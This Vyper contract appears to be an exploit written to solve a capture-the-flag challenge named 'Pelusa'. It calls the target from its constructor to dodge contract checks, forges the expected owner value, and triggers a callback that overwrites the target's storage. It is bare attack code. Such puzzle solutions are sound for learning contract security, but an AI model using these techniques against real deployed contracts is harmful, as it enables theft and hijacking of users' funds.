# @version ^0.3.7

owner: immutable(address)

instance_owner: address
goals: uint256
pelusa: address

@external
@payable
def __init__(_pelusa: address):
    res: Bytes[32] = b""
    success: bool = empty(bool)
    success, res = raw_call(
        _pelusa, 
        method_id("passTheBall()"), 
        max_outsize=32, 
        revert_on_failure=False
    )
    owner = tx.origin
    self.pelusa = _pelusa

@external
def attack(sender: address):
    assert msg.sender == owner, "!owner"
    self.instance_owner = self._calculate_owner(sender)
    raw_call(self.pelusa, method_id("shoot()"))

@internal
def _calculate_owner(sender: address) -> address:
    hash: bytes32 = keccak256(concat(convert(sender, bytes20), convert(empty(uint256), bytes32)))
    addr: address = convert(convert(hash, uint256) & max_value(uint160), address)
    return addr

@external
@view
def getBallPossesion() -> address:
    return self.instance_owner

@external
def handOfGod() -> uint256:
    self.goals = 2 
    return 22_06_1986
